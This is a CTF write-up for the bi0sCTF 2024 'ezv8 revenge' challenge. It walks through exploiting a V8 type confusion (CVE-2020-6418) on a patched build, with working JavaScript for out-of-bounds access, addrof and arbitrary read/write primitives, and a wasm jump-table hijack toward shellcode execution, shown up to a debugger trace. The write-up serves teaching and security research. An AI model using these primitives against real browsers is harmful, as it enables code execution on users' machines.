# ezv8 revenge

> Author: spektre<br>
> Description: Looks like we have some reliability issues here; what could possibly go wrong?<br>
> Attachment: [ezv8revenge.tar.gz](https://raw.githubusercontent.com/d0UBleW/ctf/main/bi0s/pwn/ezv8-revenge/ezv8revenge.tar.gz)

<div class="hidden">
    keywords: bi0sCTF 2024, pwn, browser, V8, type confusion, V8 sandbox, wasm
</div>

> [!TIP]
> Some lines of code may be hidden for brevity.
>
> Unhide the lines by clicking the `eye` button on top right corner of the code block

## TL;DR

- CVE-2020-6418 type confusion on V8 version 12.2.0 (27 Dec 2023)
- Type confusion to memory corruption to OOB access
- Hijack wasm instance's jump table starting address to jump into shellcode embedded inside JIT'd wasm code

## Patch Analysis

The given patch is the reverse of the fix for CVE-2020-6418. I stumbled upon this
awesome [N-day analysis](https://starlabs.sg/blog/2022/12-deconstructing-and-exploiting-cve-2020-6418) written by Daniel when searching for `kUnreliableMaps`. Detail on the root
cause would not be discussed here.

```diff
diff --git a/src/compiler/node-properties.cc b/src/compiler/node-properties.cc
index 08149558722..6dabffbe8d1 100644
--- a/src/compiler/node-properties.cc
+++ b/src/compiler/node-properties.cc
@@ -448,7 +448,7 @@ NodeProperties::InferMapsResult NodeProperties::InferMapsUnsafe(
           // We reached the allocation of the {receiver}.
           return kNoMaps;
         }
-        result = kUnreliableMaps;  // JSCreate can have side-effect.
+        // result = kUnreliableMaps;  // JSCreate can have side-effect.
         break;
       }
       case IrOpcode::kJSCreatePromise: {
```

As discussed in the [linked blog post](https://starlabs.sg/blog/2022/12-deconstructing-and-exploiting-cve-2020-6418), the vulnerability happens when the array type has been
changed through `Proxy`, but the JIT'd function which perform `push()` / `pop()`
operation still treats the array has the original type.

If an array is initialized with all elements of type `double`, each element would
be stored as immediate value which takes up to 64-bit of memory space.
On the other hand, for an array with mixed element types, each element would be
stored as a pointer which takes up to 32-bit of memory space. Thus, if an array
is changed from all `double` to mixed elements, there would be reallocation,
potentially from larger size to smaller size.

> [!NOTE]
> If you want to dive a bit deeper into V8 internals, you could read this little
> [note](../../../../notes/pwn/v8/) that I have written.

## Type Confusion to Memory Corruption

Let's have a look at the type confusion and how it leads to overwriting another
object field. This is the script used for triggering the type confusion:

```js,hidelines=///
THRESHOLD = 0x2000

function f(p) {
    a.push(  // [5]
        Reflect.construct(function(){}, arguments, p)?4.1835592388585281e-216:0  // [1]
    ); // itof(0x1337133700010000) = 4.1835592388585281e-216
}

let a;
let oob_arr;

let jitted = false

let p = new Proxy(Object, {
    get: function() {
        if (jitted) {
            ///eval("%DebugPrint(a)")
            ///eval("%SystemBreak()")
            a[0] = {};  // [2] change `a` from `HOLEY_DOUBLE_ELEMENTS` to `HOLEY_ELEMENTS`
            ///eval("%DebugPrint(a)")
            ///eval("%SystemBreak()")
            oob_arr = Array(1);  // [3]
            oob_arr[0] = 1.1;  // [4]
            ///eval("%DebugPrint(a)")
            ///eval("%DebugPrint(oob_arr)")
            ///eval("%SystemBreak()")
        }
        return Object.prototype;
    }
})

for (let i = 0; i <= THRESHOLD; i++) {
    a = Array(8)
    a[1] = 0.1
    a.pop()  // make a room such that push() does not reallocate elements
    if (i == THRESHOLD) {
        jitted = true;
    }
    f(p)
}
```

- `[1]`: Start of type confusion when `jitted = true` and goes into `[2]` if block statement
- `[2]`: reallocates `a` to elements that take up less space
- `[3]`: `oob_arr` object is allocated below `a.elements`, i.e., pointer to `map` and `elements`, and `length`
- `[4]`: `oob_arr.elements` is allocated below `oob_arr` object
- `[5]`: `4.1835592388585281e-216` is pushed where `a` is still treated as `HOLEY_DOUBLE_ELEMENTS` in the JIT'd code

Now, let's see it in action through debugger. Note that although after `a.pop()`
causes `a.length == 7` and this changes are reflected on the `a` `JSArray` object,
the `length` on the `elements` is still `0x8` such that when `a.push(x)` is called
it does not need to reallocate `elements`.

> [!TIP]
> Use `eval("%SystemBreak()")` to properly break into debugger when analysing the changes

> [!CAUTION]
> Initializing `oob_arr` directly like so `oob_arr = [1.1]` would make a difference
> due to how the elements are initially allocated before the array object

### Before [2]

> [!NOTE]
> Since debug version of `d8` is extremely slow, it is advisable to use the
> release version (provided that one is comfortable in pin pointing the object structure in memory)

`a.elements` takes up `72` bytes

```console
$ gdb -ex 'run' --args './d8 --allow-natives-syntax --shell ./pwn.js'
0x2833000ddf69 <JSArray[7]>
gef> tele 0x2833000ddf69-0x1  # &a
0x2833000ddf68|+0x0000|+000: 0x000006cd0018eff1  # map = 0x18eff1, properties = 0x6cd
0x2833000ddf70|+0x0008|+001: 0x0000000e000ddfa1  # elements = 0xdc599, length = 0xe >> 1 = 0x7
gef> tele 0x2833000ddfa1-0x1  # &a.elements
0x2833000ddfa0|+0x0000|+000: 0x0000001000000851  # map = 0x851, length = 0x10 >> 1 = 0x8
0x2833000ddfa8|+0x0008|+001: 0xfff7fffffff7ffff  # a[0] the_hole_value
0x2833000ddfb0|+0x0010|+002: 0x3fb999999999999a  # a[1] 0.1
0x2833000ddfb8|+0x0018|+003: 0xfff7fffffff7ffff  # a[2] the_hole_value
0x2833000ddfc0|+0x0020|+004: 0xfff7fffffff7ffff  # a[3] the_hole_value
0x2833000ddfc8|+0x0028|+005: 0xfff7fffffff7ffff  # a[4] the_hole_value
0x2833000ddfd0|+0x0030|+006: 0xfff7fffffff7ffff  # a[5] the_hole_value
0x2833000ddfd8|+0x0038|+007: 0xfff7fffffff7ffff  # a[6] the_hole_value
0x2833000ddfe0|+0x0040|+008: 0xfff7fffffff7ffff  # a[7] the_hole_value (popped)
0x2833000ddfe8|+0x0048|+009: 0x00000006001923c5
```

### After [2]

- `a.elements` takes up `40` bytes (`0x2833000dedc4 - 0x2833000dedeb`)
- followed by `HeapNumber` object for `1.1`, takes up `12` bytes (`0x2833000dedec - 0x2833000dedf7`)

```console
gef> c
0x2833000ddf69 <JSArray[7]>
gef> tele 0x2833000ddf69-0x1  # &a
0x2833000ddf68|+0x0000|+000: 0x000006cd0018f071
0x2833000ddf70|+0x0008|+001: 0x0000000e000dedc5  # elements changed to 0xdedc5
gef> tele 0x2833000dedc5-0x1  # &a.elements
0x2833000dedc4|+0x0000|+000: 0x0000001000000565  # map = 0x565
0x2833000dedcc|+0x0008|+001: 0x000deded000deda9  # 0xdeda9 is pointer to `{}`, 0xdeded is pointer to `HeapNumber 1.1`
0x2833000dedd4|+0x0010|+002: 0x000006e9000006e9  # 0x6e9 s pointer to `the_hole_value`
0x2833000deddc|+0x0018|+003: 0x000006e9000006e9
0x2833000dede4|+0x0020|+004: 0x000006e9000006e9
0x2833000dedec|+0x0028|+005: 0x9999999a000007b1  # @ 0xdedec is `HeapNumber 1.1`, map = 0x7b1, 0x3fb999999999999a = 1.1
0x2833000dedf4|+0x0030|+006: 0x001843c93fb99999
0x2833000dedfc|+0x0038|+007: 0x000006cd000006cd
0x2833000dee04|+0x0040|+008: 0x0022da110104c001
0x2833000dee0c|+0x0048|+009: 0x0022da81000de0c9
0x2833000dee14|+0x0050|+010: 0x00000605000006e9
```

### After [4] & Before [5]

If we continue here, we notice that `oob_arr` object is not allocated immediately
after the end of `a.elements`. This may be caused by us breaking two times
previously. Thus, we need to remove the previous two `%SystemBreak()` and re-run it.

```js
let p = new Proxy(Object, {
    get: function() {
        if (jitted) {
            a[0] = {};
            oob_arr = Array(1);
            oob_arr[0] = 1.1;
            eval("%DebugPrint(a)")
            eval("%DebugPrint(oob_arr)")
            eval("%SystemBreak()")
        }
        return Object.prototype;
    }
})
```

From the output below, we could see that our `oob_arr` object is just after
`a.elements` which is ideal for our exploitation later on.

```console
$ gdb -ex 'run' --args './d8 --allow-natives-syntax --shell ./pwn.js'
0x154a000dbb81 <JSArray[7]>
0x154a000dbd79 <JSArray[1]>
gef> tele 0x154a000dbb81-0x1  # &a
0x154a000dbb80|+0x0000|+000: 0x000006cd0018f071
0x154a000dbb88|+0x0008|+001: 0x0000000e000dbd45  # a.elements = 0xdbd45
gef> tele 0x154a000dbd45-0x1  # &a.elements
0x154a000dbd44|+0x0000|+000: 0x0000001000000565  # a.elements.map = 0x565, a.elements.length = 0x10 >> 1 = 0x8
0x154a000dbd4c|+0x0008|+001: 0x000dbd6d000dbd29  # a[0] = 0xdbd29 (pointer to {}), a[1] = 0xdbd6d (pointer to HeapNumber 1.1)
0x154a000dbd54|+0x0010|+002: 0x000006e9000006e9  # a[2] = the_hole_value, ...
0x154a000dbd5c|+0x0018|+003: 0x000006e9000006e9
0x154a000dbd64|+0x0020|+004: 0x000006e9000006e9
0x154a000dbd6c|+0x0028|+005: 0x9999999a000007b1  # HeapNumber 1.1
0x154a000dbd74|+0x0030|+006: 0x0018eff13fb99999  # oob_arr.map = 0x18eff1 (@ 0x154a000dbd78)
0x154a000dbd7c|+0x0038|+007: 0x000dbd95000006cd  # oob_arr.properties = 0x6cd, oob_arr.elements = 0xdbd95
0x154a000dbd84|+0x0040|+008: 0x0000056500000002  # oob_arr.elements.length = 0x2 >> 1 = 0x1
0x154a000dbd8c|+0x0048|+009: 0x000006e900000002
0x154a000dbd94|+0x0050|+010: 0x0000000200000851  # oob_arr.elements.map = 0x851, oob_arr.elements.length = 0x2 >> 1 = 0x1
0x154a000dbd9c|+0x0058|+011: 0x3ff199999999999a  # hexadecimal representation for `1.1`
0x154a000dbda4|+0x0060|+012: 0x0000000200000851
0x154a000dbdac|+0x0068|+013: 0x4000cccccccccccd
0x154a000dbdb4|+0x0070|+014: 0x000006cd0018efb1
0x154a000dbdbc|+0x0078|+015: 0x00000002000dbdcd
```

### After [5]

Now when `4.1835592388585281e-216` is pushed, it would be located at `0x154a000dbd84`

```console
gef> tele 0x154a000dbd45-0x1 # &a
0x154a000dbd44|+0x0000|+000: 0x0000001000000565  # This is how JIT'd function `f` sees `a` elements as `HOLEY_DOUBLE_ELEMENTS` kind
0x154a000dbd4c|+0x0008|+001: 0x000dbd6d000dbd29  # a[0]
0x154a000dbd54|+0x0010|+002: 0x000006e9000006e9  # a[1]
0x154a000dbd5c|+0x0018|+003: 0x000006e9000006e9  # a[2]
0x154a000dbd64|+0x0020|+004: 0x000006e9000006e9  # a[3]
0x154a000dbd6c|+0x0028|+005: 0x9999999a000007b1  # a[4]
0x154a000dbd74|+0x0030|+006: 0x0018eff13fb99999  # a[5] 
0x154a000dbd7c|+0x0038|+007: 0x000dbd95000006cd  # a[6]
0x154a000dbd84|+0x0040|+008: 0x1337133700010000  # a[7] (recently pushed)
gef> tele 0x154a000dbd79-0x1  # &oob_arr (from `oob_arr` object perspective)
0x154a000dbd78|+0x0000|+000: 0x000006cd0018eff1  # map = 0x18eff1, properties = 0x6cd
0x154a000dbd80|+0x0008|+001: 0x00010000000dbd95  # elements = 0xdbd95, length = 0x10000 >> 1 = 0x8000
0x154a000dbd88|+0x0010|+002: 0x0000000213371337
gef> c
d8> oob_arr.length.toString(16)
"8000"
```

## addrof Primitive

After overwriting `oob_arr` object length, we have out-of-bound (OOB) access as
the actual `oob_arr.elements` length is smaller than the array object length.
Let's use this OOB access to build `addrof` primitive.

If we have an array which stores an object, the array `elements` would store
the address of the object and accessing this through the declared array would
return us the object itself but not the address due to the element kind is set
accordingly. Things get interesting when we try to access this object from
another array whose element kind is of `PACKED_DOUBLE_ELEMENTS` or `HOLEY_DOUBLE_ELEMENTS`.
Since every elements in this array is interpreted as pure immediate value, the
array would not try to derefence any value. Thus, returning us the pointer
to the object.

> [!NOTE]
> SMI array works too but it only accesses 32-bit value at a time, unlike double
> array which accesses 64-bit value at a time.

Now, we introduce `obj_leaker` which would serve as an array that stores an
object and helper functions to perform the OOB access and conversion between
integer and floating number.

```js
let a;
let oob_arr;
let obj_leaker;

let jitted = false

let p = new Proxy(Object, {
    get: function() {
        if (jitted) {
            a[0] = {};
            oob_arr = Array(1);
            oob_arr[0] = 1.1;
            obj_leaker = [a, 2.2];
        }
        return Object.prototype;
    }
})
```

```js
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);

function itof(i) {
    int_view[0] = i
    return float_view[0]
}

function ftoi(f) {
    float_view[0] = f
    return int_view[0]
}

function lo(x) {
    return x & BigInt(0xffffffff)
}

function hi(x) {
    return (x >> 32n) & BigInt(0xffffffff)
}

function hex(i) {
    return "0x" + i.toString(16)
}

function oob_read32(offset) {
    // convert from uint32 indexing to uin64 indexing
    let val = ftoi(oob_arr[offset >> 1])
    if (offset % 2 == 0) {
        return lo(val)
    }
    return hi(val)
}

function oob_write32(offset, val) {
    // convert from uint32 indexing to uin64 indexing
    let temp = ftoi(oob_arr[offset >> 1])
    let new_val;
    if (offset % 2 == 0) {
        new_val = itof((hi(temp) << 32n) | val)
    } else {
        new_val = itof(val << 32n | lo(temp))
    }
    oob_arr[offset >> 1] = new_val
}

const OBJ_LEAKER_OFFSET = ??
function addrof(o) {
    obj_leaker[0] = o  // assign our target object to `obj_leaker`
    let addr = caged_oob_read32(OBJ_LEAKER_OFFSET)  // read it using `oob_arr`
    return addr
}
```

Next, we need to find `OBJ_LEAKER_OFFSET` which is the offset between
`oob_arr[0]` and `obj_leaker[0]`. This could be achieved easily by bruteforcing
and match the read value with the address of `a` (obtained from `%DebugPrint(a)`)

```js
for (let i = 0; i < 0x40; i++) {
    print(hex(i), hex(oob_read32(i)))
}
eval("%DebugPrint(a)")
```

Using release version of `d8`:

```console,hidelines=#
$ ./d8 --allow-natives-syntax ./pwn.js
[snip]
0xb 0x565
0xc 0x2
0xd 0x537c0d
0xe 0x65e589
0xf 0x6cd
[snip]
0x2b0600537c0d <JSArray[8]>
```

From the output of `%DebugPrint(a)`, we know that the address of `a` is `0x109400532779`.
Hence, we need to look for `0x532779` from the output and that would be our offset value,
which happens to be `0xd`.

```js
const OBJ_LEAKER_OFFSET = 0xd
function addrof(o) {
    obj_leaker[0] = o  // assign our target object to `obj_leaker`
    let addr = oob_read32(OBJ_LEAKER_OFFSET)  // read it using `oob_arr`
    return addr
}

print(hex(addrof(a)))
eval("%DebugPrint(a)")
```

```console
$ ./d8 --allow-natives-syntax ./pwn.js
[+] Corrupted oob_arr.length with 32768
0x53b595
0x3c630053b595 <JSArray[8]>
```

We could see that our `addrof` primitive is working but it only retrieves
the 32-bit sandbox offset which is as expected. But this is good enough for now.

## Caged Arbitrary Read and Write Primitives

Now, we will see how to get arbitrary read and write primitives inside the heap
sandbox by introducing another helper array. With OOB write, we could overwrite
this helper array `elements` pointer to control the memory address in which the
array perform read and write operation.

Recall that the `elements` object itself has 8 bytes in the beginning to store
the `map` and `length` field. If the `elements` pointer is set to `N`, performing
`arr[i]` would result in accessing memory address `(N+8) + i * element_size`.
Thus, if we want to perform AAR/AAW on addres `X`, we need to subtract it by 8
and remember to set the LSB to 1 for pointer tagging.

```js
let a;
let oob_arr;
let obj_leaker;
let c_aar_arr;
let c_aaw_arr;

let jitted = false

let p = new Proxy(Object, {
    get: function() {
        if (jitted) {
            a[0] = {};
            oob_arr = Array(1);
            oob_arr[0] = 1.1;
            obj_leaker = [a];
            c_aar_arr = [2.2];
            c_aaw_arr = [3.3];
        }
        return Object.prototype;
    }
})
```

```js
const c_aar_arr_elements_offset = ??
const c_aaw_arr_elements_offset = ??

function caged_arb_read32(addr) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aar_arr_elements_offset, elements)
    let leak = lo(ftoi(c_aar_arr[0]))
    return leak
}

function caged_arb_read64(addr) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aar_arr_elements_offset, elements)
    let leak = ftoi(c_aar_arr[0])
    return leak
}

function caged_arb_write32(addr, val) {
    let elements = addr - 8n | 1n;
    let temp = caged_arb_read32(addr+4n)
    oob_write32(c_aaw_arr_elements_offset, elements)
    c_aaw_arr[0] = itof((temp << 32n) | val)
}

function caged_arb_write64(addr, val) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aaw_arr_elements_offset, elements)
    c_aaw_arr[0] = itof(val)
}
```

This time, we would need to get the offset between:
- `oob_arr[0]` and `&c_aar_arr.elements`
- `oob_arr[0]` and `&c_aaw_arr.elements`

We could repeat the same process when finding `OBJ_LEAKER_OFFSET`, but this time
we would use GDB to see the value of `c_aar_arr.elements`

```js
for (let i = 0; i < 0x40; i++) {
    print(hex(i), hex(oob_read32(i)))
}
eval("%DebugPrint(c_aar_arr)")
eval("%DebugPrint(c_aaw_arr)")
```

```console
$ gdb -ex 'run' --args './d8 --allow-natives-syntax --shell ./pwn.js'
[snip]
0x13 0x6cd
0x14 0x5594bd
0x15 0x2
[snip]
0x21 0x6cd
0x22 0x5594f5
0x23 0x2
[snip]
gef> tele 0x327e005594a5-0x1 2
0x327e005594a4|+0x0000|+000: 0x000006cd0018efb1
0x327e005594ac|+0x0008|+001: 0x00000002005594bd
gef> tele 0x327e005594dd-0x1 2
0x327e005594dc|+0x0000|+000: 0x000006cd0018efb1
0x327e005594e4|+0x0008|+001: 0x00000002005594f5
```

The final working primitive:

```js
const c_aar_arr_elements_offset = 0x14
const c_aaw_arr_elements_offset = 0x22

function caged_arb_read32(addr) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aar_arr_elements_offset, elements)
    let leak = lo(ftoi(c_aar_arr[0]))
    return leak
}

function caged_arb_read64(addr) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aar_arr_elements_offset, elements)
    let leak = ftoi(c_aar_arr[0])
    return leak
}

function caged_arb_write32(addr, val) {
    let elements = addr - 8n | 1n;
    let temp = caged_arb_read32(addr+4n)
    oob_write32(c_aaw_arr_elements_offset, elements)
    c_aaw_arr[0] = itof((temp << 32n) | val)
}

function caged_arb_write64(addr, val) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aaw_arr_elements_offset, elements)
    c_aaw_arr[0] = itof(val)
}
```

We verify that our primitive is working with this little test:

```js
test = [6.6, 7.7]

// trying to read test[0] by getting &test.elements
test_addr = addrof(test)
test_el_addr = caged_arb_read32(test_addr+8n)
test_0 = caged_arb_read64(test_el_addr+8n)
print(itof(test_0), "===", test[0])

// trying to modify test[0] and test[1] with our write primitive
print(hex(ftoi(test[0])))
print(hex(ftoi(test[1])))
caged_arb_write32(test_el_addr+8n, 0x13371337n)
caged_arb_write32(test_el_addr+8n+4n, 0x80088008n)
caged_arb_write64(test_el_addr+8n+8n, 0xdeadbeefcafebaben)
print(hex(ftoi(test[0])))
print(hex(ftoi(test[1])))
```

```console
$ ./d8 --allow-natives-syntax ./my-poc.js
[+] Corrupted oob_arr.length with 32768
6.6 === 6.6
0x401a666666666666
0x401ecccccccccccd
0x8008800813371337
0xdeadbeefcafebabe
```

## Escaping V8 Sandbox

When one is able to perform AAR/AAW outside the heap sandbox, it is usually
considered to have escaped the sandbox. One of the common method is through corrupting
`ArrayBuffer` `backing_store` which stores raw pointer instead of compressed
pointer. However, this is not possible anymore in the V8 version that we are
using.

The novel techniques usually involve using wasm to bypass the sandbox, however some of them have been patched:
- <https://anvbis.au/posts/exploring-historical-v8-heap-sandbox-escapes-i/>
- <https://blog.theori.io/a-deep-dive-into-v8-sandbox-escape-technique-used-in-in-the-wild-exploit-d5dcf30681d4>
- <https://medium.com/@numencyberlabs/use-wasm-to-bypass-latest-chrome-v8sbx-again-639c4c05b157>

I could not find any other way to get unconstrained AAR/AAW due to lack of
raw uncompressed pointer (skill issue probably).

## Getting Code Execution

Getting code execution using shellcode as immediate numbers (as mentioned in the
[starlabs blog](https://starlabs.sg/blog/2022/12-deconstructing-and-exploiting-cve-2020-6418/#stage-2-shellcode-with-immediate-numbers))
does not work anymore.

After the end of the CTF, the author of this challenge revealed that he overwrote
`WasmInstanceObject` `jump_table_start` to hijack the execution flow into our
shellcode that we crafted inside the wasm code. Apparently, `jump_table_start`
stores the address to `RWX` page for wasm stuff.

> spektre: to escape the sandbox, you will need to use the wasm instance, there is a 64 bit raw pointer that is used to store the starting address of the jump table, if you overwrite that you will get RIP control. then you have to craft your shellcode in wasm code and then just have to jump in middle of the wasm code to execute your shellcode.

I used this [blog post](https://medium.com/@numencyberlabs/use-wasm-to-bypass-latest-chrome-v8sbx-again-639c4c05b157)
for inspiration on crafting shellcode inside wasm code using floating numbers,
as well as [starlabs blog post](https://starlabs.sg/blog/2022/12-deconstructing-and-exploiting-cve-2020-6418)
to connect the fragmented shellcode with short `jmp` and convert shellcode to floating numbers.

Let us try to use this simple wasm code

```wasm
(module
  (func (export "main") (result f64)
    f64.const 13.37
    f64.const 133.37
    f64.const 1333.37
    drop
    drop
  )
)
```

Then, compile it into bytecode using this [toolkit](https://github.com/WebAssembly/wabt).

```console
wat2wasm ./sc.wat
```

Next, convert the bytecode into array with this simple python3 script.

```py
#!/usr/bin/env python3

import sys

with open(sys.argv[1], "rb") as f:
    bc = f.read()

arr = []
for i in bc:
    arr.append(i)

print(arr)
```

```console
$ python3 ./bc.py ./sc.wasm
[0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 33, 1, 31, 0, 68, 61, 10, 215, 163, 112, 189, 42, 64, 68, 164, 112, 61, 10, 215, 171, 96, 64, 68, 20, 174, 71, 225, 122, 213, 148, 64, 26, 26, 11]
```

Next, we copy and paste the array to our javascript code for integrating wasm.

```js
// wasm.js
var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 33, 1, 31, 0, 68, 61, 10, 215, 163, 112, 189, 42, 64, 68, 164, 112, 61, 10, 215, 171, 96, 64, 68, 20, 174, 71, 225, 122, 213, 148, 64, 26, 26, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, {});
var wmain = instance.exports.main;
// JIT compile the wasm bytecode such that our floating immediate values are placed on RWX memory page
for (let j = 0x0; j < 10000; j++) {
    wmain()
}
```

Next, we run the javascript code in debugger using the debug version of `d8`.
We then try to look for our `13.37` floating numbers on a `RWX` memory page.

```console
$ gdb -ex 'run' --args './d8 --allow-natives-syntax --shell ./wasm.js'
gef> p/x 13.37
$1 = 0x402abd70a3d70a3d
gef> pipe search-pattern 0x402abd70a3d70a3d | grep -A1 'rwx'
[+] In (0x35ecd279d000-0x35ecd279e000 [rwx])
  0x35ecd279d84f:    3d 0a d7 a3 70 bd 2a 40  c4 c1 f9 6e c2 49 ba a4    |  =...p.*@...n.I..  |
```

Since we know from `numencyberlabs` blog post that the instruction would be
`mov reg, imm`, we just bruteforce subtracting `0x35ecd279d84f` with 1, 2, 3, ...
until we get the matching instruction.

```console
gef> x/10i 0x35ecd279d84f-0x2
   0x35ecd279d84d:      movabs r10,0x402abd70a3d70a3d
   0x35ecd279d857:      vmovq  xmm0,r10
   0x35ecd279d85c:      movabs r10,0x4060abd70a3d70a4
   0x35ecd279d866:      vmovq  xmm1,r10
   0x35ecd279d86b:      movabs r10,0x4094d57ae147ae14
   0x35ecd279d875:      vmovq  xmm2,r10
   0x35ecd279d87a:      mov    r10,QWORD PTR [rsi+0x77]
```

Next, we take this assembly code and dump it into [this link](https://defuse.ca/online-x86-assembler.htm)
to see the machine code.

```text
0:  49 ba 3d 0a d7 a3 70    movabs r10,0x402abd70a3d70a3d
7:  bd 2a 40
a:  c4 c1 f9 6e c2          vmovq  xmm0,r10
f:  49 ba a4 70 3d 0a d7    movabs r10,0x4060abd70a3d70a4
16: ab 60 40
19: c4 c1 f9 6e ca          vmovq  xmm1,r10
1e: 49 ba 14 ae 47 e1 7a    movabs r10,0x4094d57ae147ae14
25: d5 94 40
28: c4 c1 f9 6e d2          vmovq  xmm2,r10
```

From here, we could reason out how many bytes do we need to jump from one shellcode
to another shellcode. The answer is 7 bytes. Now that we have the jump offset,
we could tweak the shellcode conversion script from `starlabs` and use it
to generate our floating number shellcode. The modified script can be found
[here](#python3-script-for-shellcode-to-floating-numbers).

The next step is to analyse when is this `WasmInstanceObject.jump_table_start`
field accessed using debugger with debug version of `d8`.

```js
// wasm.js
var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 33, 1, 31, 0, 68, 61, 10, 215, 163, 112, 189, 42, 64, 68, 164, 112, 61, 10, 215, 171, 96, 64, 68, 20, 174, 71, 225, 122, 213, 148, 64, 26, 26, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, {});
eval("%DebugPrint(instance)")
eval("%SystemBreak")
```

We could see the debug output of an `WasmInstanceObject` and the `jump_table_start`
field is located at offset `0x48`.

```console
$ gdb -ex 'run' --args './d8 --allow-natives-syntax --shell ./wasm.js'
DebugPrint: 0x3b01000da03d: [WasmInstanceObject] in OldSpace
 - map: 0x3b01000d13a1 <Map[208](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x3b01000d144d <Object map = 0x3b01000da015>
 - elements: 0x3b01000006cd <FixedArray[0]> [HOLEY_ELEMENTS]
 - module_object: 0x3b01001c9a99 <Module map = 0x3b01000d1279>
 - exports_object: 0x3b01001c9ba9 <Object map = 0x3b01000da26d>
 - native_context: 0x3b01000c3c79 <NativeContext[285]>
 - memory_objects: 0x3b01000006cd <FixedArray[0]>
 - tables: 0x3b01000006cd <FixedArray[0]>
 - indirect_function_tables: 0x3b01000006cd <FixedArray[0]>
 - imported_function_refs: 0x3b01000006cd <FixedArray[0]>
 - indirect_function_table_refs: 0x3b01000006cd <FixedArray[0]>
 - wasm_internal_functions: 0x3b01001c9b79 <FixedArray[1]>
 - managed_object_maps: 0x3b01001c9b9d <FixedArray[1]>
 - feedback_vectors: 0x3b01000006cd <FixedArray[0]>
 - well_known_imports: 0x3b01000006cd <FixedArray[0]>
 - memory0_start: 0x3c00ffffffff
 - memory0_size: 0
 - new_allocation_limit_address: 0x5555557030d0
 - new_allocation_top_address: 0x5555557030c8
 - old_allocation_limit_address: 0x5555557030e8
 - old_allocation_top_address: 0x5555557030e0
 - imported_function_targets: 0x3b0100000e69 <ByteArray[0]>
 - globals_start: 0x3c00ffffffff
 - imported_mutable_globals: 0x3b0100000e69 <ByteArray[0]>
 - indirect_function_table_size: 0
 - indirect_function_table_sig_ids: 0x3b0100000e69 <ByteArray[0]>
 - indirect_function_table_targets: 0x3b0100006175 <ExternalPointerArray[0]>
 - isorecursive_canonical_types: 0x55555577d8a0
 - jump_table_start: 0x2ba49517a000
 - data_segment_starts: 0x3b0100000e69 <ByteArray[0]>
 - data_segment_sizes: 0x3b0100000e69 <ByteArray[0]>
 - element_segments: 0x3b01000006cd <FixedArray[0]>
 - hook_on_function_call_address: 0x555555702c09
 - tiering_budget_array: 0x555555774330
 - memory_bases_and_sizes: 0x3b0100000e69 <ByteArray[0]>
 - break_on_entry: 0
 - properties: 0x3b01000006cd <FixedArray[0]>
 - All own properties (excluding elements): {}

gef> tele 0x3b01000da03c 10
0x3b01000da03c|+0x0000|+000: 0x000006cd000d13a1
0x3b01000da044|+0x0008|+001: 0x000006cd000006cd
0x3b01000da04c|+0x0010|+002: 0x00000e69000006cd
0x3b01000da054|+0x0018|+003: 0x00000e6900006175 ('ua'?)
0x3b01000da05c|+0x0020|+004: 0x0000000000000e69
0x3b01000da064|+0x0028|+005: 0xffffffffff000000
0x3b01000da06c|+0x0030|+006: 0x0000000000000000
0x3b01000da074|+0x0038|+007: 0x000055555577d8a0  ->  0x00007fff00000003
0x3b01000da07c|+0x0040|+008: 0xffffffffff000000
0x3b01000da084|+0x0048|+009: 0x00002ba49517a000  ->  0x000000000007bbe9
```

Next, we setup a read watchpoint at `0x3b01000da084`, continue, then execute:

```js
var wmain = instance.exports.main;
wmain();
```

```console
gef> rwatch *0x3b01000da084
Hardware read watchpoint 1: *0x3b01000da084
gef> c
V8 version 12.2.0 (candidate)
d8> var wmain = instance.exports.main;
undefined
d8> wmain();

Thread 1 "d8" hit Hardware read watchpoint 1: *0x3b01000da084
    0x7ffff3a72e01 4c037e47           <Builtins_WasmCompileLazy+0xc1>   add    r15, QWORD PTR [rsi + 0x47]
 -> 0x7ffff3a72e05 48837df82c         <Builtins_WasmCompileLazy+0xc5>   cmp    QWORD PTR [rbp - 0x8], 0x2c
    0x7ffff3a72e0a 741d               <Builtins_WasmCompileLazy+0xca>   je     0x7ffff3a72e29 <Builtins_WasmCompileLazy+0xe9>
gef> x/gx $rsi+0x47
0x3b01000da084: 0x00002ba49517a000
gef> x/20i $rip
=> 0x7ffff3a72e05 <Builtins_WasmCompileLazy+197>:       cmp    QWORD PTR [rbp-0x8],0x2c
   0x7ffff3a72e0a <Builtins_WasmCompileLazy+202>:       je     0x7ffff3a72e29 <Builtins_WasmCompileLazy+233>
   0x7ffff3a72e0c <Builtins_WasmCompileLazy+204>:       mov    edi,0x30
   0x7ffff3a72e11 <Builtins_WasmCompileLazy+209>:       mov    r10,rsp
   0x7ffff3a72e14 <Builtins_WasmCompileLazy+212>:       sub    rsp,0x8
   0x7ffff3a72e18 <Builtins_WasmCompileLazy+216>:       and    rsp,0xfffffffffffffff0
   0x7ffff3a72e1c <Builtins_WasmCompileLazy+220>:       mov    QWORD PTR [rsp],r10
   0x7ffff3a72e20 <Builtins_WasmCompileLazy+224>:       mov    rax,QWORD PTR [r13+0x1cb8]
   0x7ffff3a72e27 <Builtins_WasmCompileLazy+231>:       call   rax
   0x7ffff3a72e29 <Builtins_WasmCompileLazy+233>:       mov    rsp,rbp
   0x7ffff3a72e2c <Builtins_WasmCompileLazy+236>:       pop    rbp
   0x7ffff3a72e2d <Builtins_WasmCompileLazy+237>:       jmp    r15
   0x7ffff3a72e30:      int3
   0x7ffff3a72e31:      int3
   0x7ffff3a72e32:      int3
